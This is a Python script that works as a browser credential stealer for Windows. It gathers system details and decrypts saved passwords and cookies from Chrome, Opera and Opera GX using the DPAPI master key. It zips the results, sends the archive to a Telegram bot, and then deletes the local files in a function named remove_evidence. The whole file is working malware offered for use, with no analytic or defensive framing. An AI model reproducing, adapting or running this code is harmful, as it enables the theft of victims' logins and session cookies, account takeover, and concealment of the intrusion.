import glob
import os
import json
import time
import socket
import shutil
import win32crypt
from Crypto.Cipher import AES
import base64
import zipfile
import getpass
import yaml
import sqlite3
import platform
import requests
import getmac

with open("cfg.yaml", "r") as yml:
    data = yaml.safe_load(yml)
    TOKEN, CHAT_ID = data["BOT_TOKEN"], data["CHAT_ID"]


# BOT_TOKEN, CHAT_ID = "", ""


def create_environment(path=os.path.join(os.getenv("APPDATA"), "Logs")):
    if os.path.isdir(path) is False:
        os.mkdir(path=path)
    return path


def get_system(path_to_save):
    sys = {
        "Time": time.asctime(),
        "System": platform.system(),
        "User": getpass.getuser(),
        "Processor": platform.processor(),
        "Win32-version": platform.win32_ver(),
        "Edition": platform.win32_edition(),
        "IP": socket.gethostbyname(socket.gethostname()),
        "MAC": getmac.getmac.get_mac_address()
    }

    with open(path_to_save + "\\system.json", "w", encoding="utf-8") as file:
        json.dump(sys, file, indent=4, ensure_ascii=False)
    return sys


def get_master_key(path):
    with open(path, "r", encoding='utf-8') as file:
        local_state = file.read()
        local_state = json.loads(local_state)

    decoding = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = win32crypt.CryptUnprotectData(decoding, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff, master_key):
    cipher = AES.new(master_key, AES.MODE_GCM, buff[3:15])
    decrypted_pass = cipher.decrypt(buff[15:])
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def decrypt_cookies(encrypted_value, key_path):
    decrypted_value = AES.new(
        get_master_key(key_path), AES.MODE_GCM, nonce=encrypted_value[3:3 + 12]
    )
    decrypted_value = decrypted_value.decrypt_and_verify(
        encrypted_value[3 + 12:-16], encrypted_value[-16:]
    )

    try:
        return decrypted_value.decode()
    except Exception as ex:
        print(ex)


def passwords(path_to_save):
    dict_paths = {
        "Chrome": [os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                   os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State"],

        "OperaGX": [os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Login Data",
                    os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State"],

        "Opera": [os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data",
                  os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State"]
    }
    accounts = {
        "Chrome": [],
        "OperaGX": [],
        "Opera": []
    }

    for browser, paths in dict_paths.items():
        if os.path.exists(paths[1]):

            backup = paths[0] + " Backup"
            shutil.copy2(paths[0], backup)
            master_key = get_master_key(paths[1])

            try:
                connection = sqlite3.connect(backup)
                curs = connection.cursor()
                curs.execute(
                    """SELECT action_url, username_value, password_value 
                       FROM logins"""
                )

                for password in list(curs.fetchall()):
                    source, login, password = password[0], password[1], decrypt_password(password[2], master_key)
                    if "" not in [source, login, password]:
                        accounts[browser].append({
                            "Source": source,
                            "Login": login,
                            "Password": password
                        })
            except Exception as ex:
                accounts[browser].append(f"Exception: {ex}")

    with open(path_to_save + "\\passwords.json", "w", encoding="utf-8") as file:
        json.dump(accounts, file, indent=4, ensure_ascii=False)


def cookies(save_path):
    dict_paths = {
        "Chrome": [os.getenv("LOCALAPPDATA") + R"\Google\Chrome\User Data\Default\Network\Cookies",
                   os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State"],

        "OperaGX": [os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Cookies",
                    os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State"],

        "Opera": [os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Cookies",
                  os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State"]
    }

    cookies_dict = {
        "Chrome": [],
        "OperaGX": [],
        "Opera": []
    }
    for browser, paths in dict_paths.items():
        if os.path.exists(paths[1]):
            backup = paths[0] + " Backup"
            shutil.copy2(paths[0], backup)

            try:
                connection = sqlite3.connect(backup)
                curs = connection.cursor()
                data = curs.execute("""SELECT host_key, name, encrypted_value 
                                       FROM cookies""")

                for row in data.fetchall():
                    cookie, host, name = decrypt_cookies(encrypted_value=row[2], key_path=paths[1]), row[0], row[1]
                    cookies_dict[browser].append({
                        "Cookie": cookie,
                        "Host": host,
                        "Name": name
                    })

            except Exception as ex:
                cookies_dict[browser].append(f"Exception: {ex}")

    with open(save_path + "\\cookies.json", "w", encoding="utf-8") as file:
        json.dump(cookies_dict, file, indent=4, ensure_ascii=False)


def zipper():
    os.chdir(os.getenv("APPDATA"))
    arc = zipfile.ZipFile(str(getpass.getuser() + ".zip"), "w")
    for root, dirs, files in os.walk("Logs"):
        for file in files:
            arc.write(os.path.join(root, file))
    arc.close()


def remove_evidence(path):
    paths = glob.glob(pathname=path + "\\*.json", recursive=True)
    for i in paths:
        os.remove(i)

    os.remove(os.getenv("APPDATA") + f"\\{getpass.getuser()}.zip")
    os.rmdir(path)


def send_message():
    archive = os.getenv("APPDATA") + f'\\{getpass.getuser()}.zip'
    files = {'document': open(archive, 'rb')}
    data = {'chat_id': CHAT_ID}

    try:
        requests.post("https://api.telegram.org/bot" + TOKEN + "/sendDocument", files=files, data=data, timeout=(1, 10))
    except Exception as ex:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={getpass.getuser()}:{ex}")


def main():
    path = create_environment()
    if os.path.exists(path):
        get_system(path)
        passwords(path)
        cookies(path)
        zipper()
        send_message()

    remove_evidence(path)


if __name__ == '__main__':
    main()
